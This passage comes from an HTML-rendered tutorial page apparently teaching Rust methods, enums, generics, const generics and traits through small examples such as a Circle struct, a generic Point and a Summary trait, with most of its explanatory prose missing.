class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Circle&amp;selfCircle</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>javajavastructimpl</p>\n<p>impl</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>impl</p>\n<h3 id=\"-amp-\"><a href=\"#-amp-\" class=\"headerlink\" title=\"&amp;\"></a>&amp;</h3><p><code></code><code></code></p>\n<p></p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n    radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">// newCircleself</span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">new</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">,</span> radius<span class=\"token punctuation\">:</span> <span class=\"token keyword\">f64</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token class-name\">Circle</span> <span class=\"token punctuation\">&#123;</span>\n            x<span class=\"token punctuation\">:</span> x<span class=\"token punctuation\">,</span>\n            y<span class=\"token punctuation\">:</span> y<span class=\"token punctuation\">,</span>\n            radius<span class=\"token punctuation\">:</span> radius<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// Circle&amp;selfCircle</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">area</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f64</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token namespace\">std<span class=\"token punctuation\">::</span></span><span class=\"token keyword\">f64</span><span class=\"token punctuation\">::</span><span class=\"token namespace\">consts<span class=\"token punctuation\">::</span></span><span class=\"token constant\">PI</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius <span class=\"token operator\">*</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>radius<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><code>&amp;self</code> <code>self: &amp;Self</code> <code>circle.area()</code></p>\n<p><strong></strong></p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token attribute attr-name\">#![allow(unused)]</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Quit</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Move</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token keyword\">i32</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">ChangeColor</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">i32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Message</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">call</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// </span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n\t<span class=\"token keyword\">let</span> m <span class=\"token operator\">=</span> <span class=\"token class-name\">Message</span><span class=\"token punctuation\">::</span><span class=\"token class-name\">Write</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">::</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"hello\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\tm<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"-amp--trait\"><a href=\"#-amp--trait\" class=\"headerlink\" title=\"&amp;(trait)\"></a>&amp;(trait)</h2><h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i8: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">2i8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3i8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add i32: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">,</span> <span class=\"token number\">30</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"add f64: &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span><span class=\"token number\">1.23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1.23</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<h3 id=\"trait\"><a href=\"#trait\" class=\"headerlink\" title=\"trait\"></a>trait</h3><p></p>\n<p>kotlin</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>ops<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Add</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">Output</span> <span class=\"token operator\">=</span> <span class=\"token class-name\">T</span><span class=\"token operator\">>></span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">:</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n    a <span class=\"token operator\">+</span> b\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><code>std::ops::Add&lt;Output = T&gt;</code>kotlinrust<code>trait </code>,<code>std::ops::Add&lt;Output = T&gt;</code>,output</p>\n<blockquote>\n<p><strong></strong></p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Option</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Some</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">None</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">enum</span> <span class=\"token type-definition class-name\">Result</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">E</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token class-name\">Ok</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n    <span class=\"token class-name\">Err</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    x<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n    y<span class=\"token punctuation\">:</span> <span class=\"token class-name\">T</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">x</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token operator\">&amp;</span><span class=\"token class-name\">T</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token class-name\">Point</span> <span class=\"token punctuation\">&#123;</span> x<span class=\"token punctuation\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span> <span class=\"token number\">10</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"p.x = &#123;&#125;\"</span><span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">.</span><span class=\"token function\">x</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<blockquote>\n<p><code>T,U</code>  <code>Point</code> <code>V,W</code>  <code>mixup</code> </p>\n</blockquote>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> <code>Point&lt;T&gt;</code>  <code>T</code> </p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">impl</span> <span class=\"token class-name\">Point</span><span class=\"token operator\">&lt;</span><span class=\"token keyword\">f32</span><span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">distance_from_origin</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token keyword\">f32</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token punctuation\">(</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">.</span><span class=\"token function\">powi</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sqrt</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p> <code>Point&lt;f32&gt;</code>  <code>distance_from_origin</code> <code>T</code>  <code>f32</code>  <code>Point&lt;T&gt; </code><code>(0.0, 0.0)</code> </p>\n<p></p>\n</blockquote>\n<h3 id=\"const-\"><a href=\"#const-\" class=\"headerlink\" title=\"const \"></a>const </h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token operator\">&amp;</span><span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<p>const</p>\n<pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">display_array</span><span class=\"token operator\">&lt;</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">:</span> <span class=\"token namespace\">std<span class=\"token punctuation\">::</span>fmt<span class=\"token punctuation\">::</span></span><span class=\"token class-name\">Debug</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">const</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">usize</span><span class=\"token operator\">></span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token class-name\">T</span><span class=\"token punctuation\">;</span> <span class=\"token class-name\">N</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token macro property\">println!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;:?&#125;\"</span><span class=\"token punctuation\">,</span> arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">let</span> arr<span class=\"token punctuation\">:</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">i32</span><span class=\"token punctuation\">;</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token function\">display_array</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>usizeusize</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><blockquote>\n<p> Rust </p>\n<p>Rust </p>\n<p></p>\n<p>Rust  <strong></strong>(<em>monomorphization</em>)</p>\n<p></p>\n</blockquote>\n<h2 id=\"-trait\"><a href=\"#-trait\" class=\"headerlink\" title=\"(trait)\"></a>(trait)</h2><p>javainterface</p>\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n    \n    <span class=\"token comment\">// </span>\n    <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize1</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token string\">\"\"</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">self</span><span class=\"token punctuation\">.</span><span class=\"token function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h3><pre class=\"line-numbers language-rust\" data-language=\"rust\"><code class=\"language-rust\"><span class=\"token keyword\">pub</span> <span class=\"token keyword\">trait</span> <span class=\"token class-name\">Summary</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">pub</span> <span class=\"token keyword\">struct</span> <span class=\"token type-definition class-name\">Post</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">pub</span> title<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">pub</span> author<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n    <span class=\"token keyword\">pub</span> content<span class=\"token punctuation\">:</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">,</span> <span class=\"token comment\">// </span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">impl</span> <span class=\"token class-name\">Summary</span> <span class=\"token keyword\">for</span> <span class=\"token class-name\">Post</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">fn</span> <span class=\"token function-definition function\">summarize</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token keyword\">self</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">-></span> <span class=\"token class-name\">String</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token macro property\">format!</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"&#123;&#125;, &#123;&#125;\"</span><span class=\"token punctuation\">,</span> <span class=\"token 